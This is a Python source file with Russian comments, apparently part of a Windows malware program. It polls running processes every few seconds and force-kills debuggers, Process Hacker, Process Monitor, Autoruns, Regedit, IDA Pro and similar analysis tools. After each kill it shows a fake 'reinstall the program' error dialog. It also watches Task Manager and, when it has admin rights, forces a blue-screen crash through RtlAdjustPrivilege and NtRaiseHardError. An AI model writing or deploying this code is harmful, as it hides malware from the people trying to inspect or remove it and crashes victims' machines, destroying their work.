import time
import subprocess
import tkinter as tk
from tkinter import messagebox
import ctypes
import psutil
import schedule

global start


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


root = tk.Tk()
root.withdraw()

process_name = "Taskmgr.exe"  # имя процесса, который нужно проверить
process_file_path = '""C:\\Windows\\System32\\Taskmgr.exe""'  # путь к файлу процесса

processes_non_admin = ["Process Explorer.exe", "Task Manager.exe", "Process Hacker.exe", "Process Monitor.exe",
                       "Autoruns.exe", "Dependency Walker.exe", "Registry Monitor.exe", "Regmon.exe",
                       "Process Identifier.exe", "Tlist.exe", "PEView.exe", "PEBrowse Professional.exe", "DbgView.exe",
                       "WinDbg.exe", "IDA Pro.exe", "Hex-Rays Decompiler.exe"]

# Administrator Killable Processes
processes_admin = ["Core Impact.exe", "Registry Editor.exe", "Regedit.exe", "Regedt32.exe", "Process Killer.exe",
                   "Killer.exe", "Process Hacker.exe", "Process Monitor.exe", "Autoruns.exe", "Dependency Walker.exe",
                   "Registry Monitor.exe", "Regmon.exe", "Process Identifier.exe", "Tlist.exe", "PEView.exe",
                   "PEBrowse Professional.exe", "DbgView.exe", "WinDbg.exe", "IDA Pro.exe", "Hex-Rays Decompiler.exe"]


def bsod():
    nullptr = ctypes.POINTER(ctypes.c_int)()

    ctypes.windll.ntdll.RtlAdjustPrivilege(
        ctypes.c_uint(19),
        ctypes.c_uint(1),
        ctypes.c_uint(0),
        ctypes.byref(ctypes.c_int())
    )

    ctypes.windll.ntdll.NtRaiseHardError(
        ctypes.c_ulong(0xC000007B),
        ctypes.c_ulong(0),
        nullptr,
        nullptr,
        ctypes.c_uint(6),
        ctypes.byref(ctypes.c_uint())
    )


def if_not_work(start):
    # если процесс не работает, то пытаемся его перезапустить
    try:
        if start and is_admin():
            # Вызываем BSOD, если есть права администратора и MadNet нет в списке процессов
            bsod()
        else:
            # проверяем, запущен ли скрипт от имени администратора
            if is_admin():
                # если запущен, то перезапускаем процесс от имени администратора
                subprocess.run(["start", "cmd", "/c", "runas", process_file_path])
                start = True
            else:
                # если не запущен, то перезапускаем процесс обычным способом
                subprocess.run(process_file_path)
                start = True
    except:
        return False


def check_and_restart_process():
    start = False
    while True:
        # проверяем, работает ли процесс
        processes = psutil.process_iter()
        work = False
        for process in processes:
            if process.name() == process_name:
                work = True
            if not is_admin():
                for debugger in processes_non_admin:
                    if debugger in process.name():
                        subprocess.run(["taskkill", "/IM", f"{debugger}", "/F"])
                        messagebox.showerror("Ошибка",
                                             "Неизвестная ошибка во время работы программы. Пожалуйста, попробуйте "
                                             "удалить и заново установить программу, либо обратитесь к специалисту за "
                                             "помощью.")
            elif is_admin():
                for debugger in processes_admin:
                    if debugger in process.name():
                        subprocess.run(["taskkill", "/IM", f"{debugger}", "/F"])
                        messagebox.showerror("Ошибка",
                                             "Неизвестная ошибка во время работы программы. Пожалуйста, попробуйте "
                                             "удалить и заново установить программу, либо обратитесь к специалисту за "
                                             "помощью.")
        if not work:
            if_not_work(start)

        time.sleep(5)  # ждем перед следующей проверкой


while True:
    schedule.every(1).seconds.do(job_func=check_and_restart_process)
    schedule.run_pending()
